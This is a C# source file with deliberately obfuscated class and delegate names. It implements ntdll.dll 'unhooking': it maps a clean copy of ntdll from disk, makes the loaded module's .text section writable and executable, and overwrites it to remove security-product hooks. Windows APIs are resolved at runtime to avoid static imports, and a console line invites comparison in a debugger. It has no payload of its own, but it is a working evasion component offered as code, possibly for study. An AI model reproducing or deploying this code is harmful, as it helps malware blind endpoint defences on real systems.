using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace a
{
    class b
    {


        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public ushort Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public ushort Subsystem;

            [FieldOffset(70)]
            public ushort DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }
        [StructLayout(LayoutKind.Explicit, Size = 20)]
        public struct IMAGE_FILE_HEADER
        {
            [FieldOffset(0)]
            public UInt16 Machine;
            [FieldOffset(2)]
            public UInt16 NumberOfSections; //keep
            [FieldOffset(4)]
            public UInt32 TimeDateStamp;
            [FieldOffset(8)]
            public UInt32 PointerToSymbolTable;
            [FieldOffset(12)]
            public UInt32 NumberOfSymbols;
            [FieldOffset(16)]
            public UInt16 SizeOfOptionalHeader;
            [FieldOffset(18)]
            public UInt16 Characteristics;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;
            public UInt16 e_cblp;
            public UInt16 e_cp;
            public UInt16 e_crlc;
            public UInt16 e_cparhdr;
            public UInt16 e_minalloc;
            public UInt16 e_maxalloc;
            public UInt16 e_ss;
            public UInt16 e_sp;
            public UInt16 e_csum;
            public UInt16 e_ip;
            public UInt16 e_cs;
            public UInt16 e_lfarlc;
            public UInt16 e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;
            public UInt16 e_oemid;
            public UInt16 e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;
            public Int32 e_lfanew;

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == "MZ"; }
            }
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public int Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)]
            public UInt32 VirtualSize;

            [FieldOffset(12)]
            public UInt32 VirtualAddress;

            [FieldOffset(16)]
            public UInt32 SizeOfRawData;

            [FieldOffset(20)]
            public UInt32 PointerToRawData;

            [FieldOffset(24)]
            public UInt32 PointerToRelocations;

            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;

            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;

            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;

            [FieldOffset(36)]
            public uint Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool clsh
        (IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool frlb
        (IntPtr hModule);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr mpvfl
        (IntPtr hFileMappingObject, uint dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);


        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        public delegate IntPtr crtflmp
        (IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr crtfla
        (string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool getmodinf
        (IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
        public delegate IntPtr getmodh
        (string lpModuleName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr getprc
        ();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr mvmem
        (IntPtr dest, IntPtr src, UInt32 count);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr vproc
        (IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static int Main()
        {


                            static IntPtr getPtr(string dllName, string funcName)
        {

            IntPtr hModule = LoadLibrary(dllName);
            IntPtr Ptr = GetProcAddress(hModule, funcName);
            return Ptr;

        }

        IntPtr ptr1 = getPtr("kernel32.dll", "VirtualProtect");
        vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer(ptr1, typeof(vproc));

        IntPtr ptr2 = getPtr("kernel32.dll", "RtlMoveMemory");
        mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer(ptr2, typeof(mvmem));

        IntPtr ptr8 = getPtr("kernel32.dll", "GetCurrentProcess");
        getprc gtp = (getprc)Marshal.GetDelegateForFunctionPointer(ptr8, typeof(getprc));

        IntPtr ptr9 = getPtr("kernel32.dll", "GetModuleHandleW");
        getmodh gtmh = (getmodh)Marshal.GetDelegateForFunctionPointer(ptr9, typeof(getmodh));

        IntPtr ptr10 = getPtr("psapi.dll", "GetModuleInformation");
            getmodinf gtmi = (getmodinf)Marshal.GetDelegateForFunctionPointer(ptr10, typeof(getmodinf));

    IntPtr ptr11 = getPtr("kernel32.dll", "CreateFileA");
    crtfla crtfl = (crtfla)Marshal.GetDelegateForFunctionPointer(ptr11, typeof(crtfla));

    IntPtr ptr12 = getPtr("kernel32.dll", "CreateFileMappingW");
    crtflmp crtflm = (crtflmp)Marshal.GetDelegateForFunctionPointer(ptr12, typeof(crtflmp));

    IntPtr ptr13 = getPtr("kernel32.dll", "MapViewOfFile");
    mpvfl mp = (mpvfl)Marshal.GetDelegateForFunctionPointer(ptr13, typeof(mpvfl));

    IntPtr ptr14 = getPtr("kernel32.dll", "FreeLibrary");
    frlb frl = (frlb)Marshal.GetDelegateForFunctionPointer(ptr14, typeof(frlb));

IntPtr ptr15 = getPtr("kernel32.dll", "CloseHandle");
clsh cls = (clsh)Marshal.GetDelegateForFunctionPointer(ptr15, typeof(clsh));

IntPtr curProc = gtp();
MODULEINFO modInfo;
IntPtr handle = gtmh("ntdll.dll");
gtmi(curProc, handle, out modInfo, 0x18);
IntPtr dllBase = modInfo.lpBaseOfDll;
IntPtr file = crtfl("C:\\Windows\\System32\\ntdll.dll", 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
IntPtr mapping = crtflm(file, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);
IntPtr mappedFile = mp(mapping, 0x0004, 0, 0, IntPtr.Zero);

IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
IntPtr ptrToNt = (dllBase + dosHeader.e_lfanew);
IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrToNt, typeof(IMAGE_NT_HEADERS64));
for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
{
    IntPtr ptrSectionHeader = (ptrToNt + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
    string sectionName = new string(sectionHeader.Name);

    if (sectionName.Contains("text"))
    {
        uint oldProtect = 0;
        IntPtr lpAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
        IntPtr srcAddress = IntPtr.Add(mappedFile, (int)sectionHeader.VirtualAddress);
        vp(lpAddress, sectionHeader.VirtualSize, 0x40, out oldProtect);
        mm(lpAddress, srcAddress, sectionHeader.VirtualSize);
    }
}

Console.WriteLine("Unhooked, compare functions in x64 dbg");
Console.Read();
Console.Read();

cls(curProc);
cls(file);
cls(mapping);
frl(handle);

return 0;
            }
            
            }
            }
